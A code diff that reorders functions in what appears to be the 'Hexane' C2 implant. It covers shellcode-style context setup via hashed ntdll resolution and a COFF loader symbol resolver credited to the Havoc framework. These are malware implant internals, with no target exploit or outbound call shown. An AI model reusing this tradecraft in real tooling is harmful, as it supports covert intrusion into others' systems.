@@ -75,6 +75,56 @@ namespace Memory {
 
     namespace Context {
 
+        VOID ContextInit() {
+            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
+
+            _hexane instance = { };
+            size_t region_size = 0;
+            void *region = { };
+
+            instance.Teb = NtCurrentTeb();
+            instance.Heap = instance.Teb->ProcessEnvironmentBlock->ProcessHeap;
+
+            instance.Teb->LastErrorValue = ERROR_SUCCESS;
+            instance.Base.Address = U_PTR(InstStart());
+            instance.Base.Size = U_PTR(InstEnd()) - instance.Base.Address;
+
+            region = C_PTR(GLOBAL_OFFSET);
+            region_size = sizeof(region);
+
+            if (
+                !(instance.Modules.ntdll = M_PTR(NTDLL)) ||
+                !(F_PTR_HMOD(instance.Nt.NtProtectVirtualMemory, instance.Modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
+                !(F_PTR_HMOD(instance.Nt.RtlAllocateHeap, instance.Modules.ntdll, RTLALLOCATEHEAP)) ||
+                !(F_PTR_HMOD(instance.Nt.RtlRandomEx, instance.Modules.ntdll, RTLRANDOMEX))) {
+                return;
+            }
+
+            if (!NT_SUCCESS(instance.Nt.NtProtectVirtualMemory(NtCurrentProcess(), &region, &region_size, PAGE_READWRITE, nullptr))) {
+                return;
+            }
+            region = C_PTR(GLOBAL_OFFSET);
+            if (!(C_DREF(region) = instance.Nt.RtlAllocateHeap(instance.Heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
+                return;
+            }
+
+            x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
+            x_memset(&instance, 0, sizeof(_hexane));
+            x_memset(C_PTR(U_PTR(region) + sizeof(LPVOID)), 0, 0xE);
+        }
+
+        VOID ContextDestroy(_hexane* Ctx) {
+            // todo: needs expanded
+
+            auto RtlFreeHeap = Ctx->Nt.RtlFreeHeap;
+            auto Heap = Ctx->Heap;
+
+            x_memset(Ctx, 0, sizeof(_hexane));
+
+            if (RtlFreeHeap) {
+                RtlFreeHeap(Heap, 0, Ctx);
+            }
+        }
         VOID ResolveApi() {
             HEXANE
 
@@ -211,105 +261,9 @@ namespace Memory {
             defer:
         }
 
-        VOID ContextInit() {
-            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
-
-            _hexane instance = { };
-            size_t region_size = 0;
-            void *region = { };
-
-            instance.Teb = NtCurrentTeb();
-            instance.Heap = instance.Teb->ProcessEnvironmentBlock->ProcessHeap;
-
-            instance.Teb->LastErrorValue = ERROR_SUCCESS;
-            instance.Base.Address = U_PTR(InstStart());
-            instance.Base.Size = U_PTR(InstEnd()) - instance.Base.Address;
-
-            region = C_PTR(GLOBAL_OFFSET);
-            region_size = sizeof(region);
-
-            if (
-                !(instance.Modules.ntdll = M_PTR(NTDLL)) ||
-                !(F_PTR_HMOD(instance.Nt.NtProtectVirtualMemory, instance.Modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(instance.Nt.RtlAllocateHeap, instance.Modules.ntdll, RTLALLOCATEHEAP)) ||
-                !(F_PTR_HMOD(instance.Nt.RtlRandomEx, instance.Modules.ntdll, RTLRANDOMEX))) {
-                return;
-            }
-
-            if (!NT_SUCCESS(instance.Nt.NtProtectVirtualMemory(NtCurrentProcess(), &region, &region_size, PAGE_READWRITE, nullptr))) {
-                return;
-            }
-            region = C_PTR(GLOBAL_OFFSET);
-            if (!(C_DREF(region) = instance.Nt.RtlAllocateHeap(instance.Heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
-                return;
-            }
-
-            x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
-            x_memset(&instance, 0, sizeof(_hexane));
-            x_memset(C_PTR(U_PTR(region) + sizeof(LPVOID)), 0, 0xE);
-        }
-
-        VOID ContextDestroy(_hexane* Ctx) {
-            // todo: needs expanded
-
-            auto RtlFreeHeap = Ctx->Nt.RtlFreeHeap;
-            auto Heap = Ctx->Heap;
-
-            x_memset(Ctx, 0, sizeof(_hexane));
-
-            if (RtlFreeHeap) {
-                RtlFreeHeap(Heap, 0, Ctx);
-            }
-        }
     }
 
     namespace Objects {
-
-        UINT_PTR GetInternalAddress(const char* name, bool* internal) {
-            HEXANE
-
-            uintptr_t address = { };
-            *internal = false;
-
-            for (uint32_t i = 0 ;; i++) {
-                if (!cmd_map[i].name) {
-                    return_defer(ERROR_PROC_NOT_FOUND);
-                }
-
-                if (cmd_map[i].name == name) {
-                   *internal = true;
-                   address = U_PTR(cmd_map[i].address);
-                }
-            }
-
-            defer:
-            return address;
-        }
-
-        UINT_PTR ResolveSymbol(_executable *object, const char* entry_name, uint32_t type) {
-            // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c#L87
-            HEXANE
-
-            uintptr_t address = { };
-            bool is_internal = false;
-
-            if ((address = GetInternalAddress(entry_name, &is_internal)) && is_internal) {
-                return address;
-            } else {
-                char *lib_name = { };
-                char *fn_name = { };
-                /*
-                 * ok, hear me out:
-                 *      auto name = "__imp_NTDLL$NtAllocateVirtualMemory" or "__Hexane$OpenUserProcess"
-                 *      map[string]string = strings.Split(name, "$")
-                 *
-                 *      LoadExport(module, function);
-                 */
-
-                address = Modules::LoadExport(lib_name, fn_name);
-                return address;
-            }
-        }
 
         BOOL BaseRelocation(_executable *object) {
             HEXANE
@@ -453,6 +407,53 @@ namespace Memory {
 
             return success;
         }
+
+        UINT_PTR GetInternalAddress(const char* name, bool* internal) {
+            HEXANE
+
+            uintptr_t address = { };
+            *internal = false;
+
+            for (uint32_t i = 0 ;; i++) {
+                if (!cmd_map[i].name) {
+                    return_defer(ERROR_PROC_NOT_FOUND);
+                }
+
+                if (cmd_map[i].name == name) {
+                   *internal = true;
+                   address = U_PTR(cmd_map[i].address);
+                }
+            }
+
+            defer:
+            return address;
+        }
+
+        UINT_PTR ResolveSymbol(_executable *object, const char* entry_name, uint32_t type) {
+            // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c#L87
+            HEXANE
+
+            uintptr_t address = { };
+            bool is_internal = false;
+
+            if ((address = GetInternalAddress(entry_name, &is_internal)) && is_internal) {
+                return address;
+            } else {
+                char *lib_name = { };
+                char *fn_name = { };
+                /*
+                 * ok, hear me out:
+                 *      auto name = "__imp_NTDLL$NtAllocateVirtualMemory" or "__Hexane$OpenUserProcess"
+                 *      map[string]string = strings.Split(name, "$")
+                 *
+                 *      LoadExport(module, function);
+                 */
+
+                address = Modules::LoadExport(lib_name, fn_name);
+                return address;
+            }
+        }
+
 
         SIZE_T GetFunctionMapSize(_executable *object) {
             HEXANE
@@ -704,7 +705,7 @@ namespace Memory {
                 goto defer;
             }
 
-            if (!(address = Memory::Objects::GetInternalAddress(cmd_id, &is_internal)) || !is_internal) {
+            if (!(address = Objects::GetInternalAddress(cmd_id, &is_internal)) || !is_internal) {
                 return_defer(ntstatus);
                 // todo: error_transmit("command not found : %s")
             }
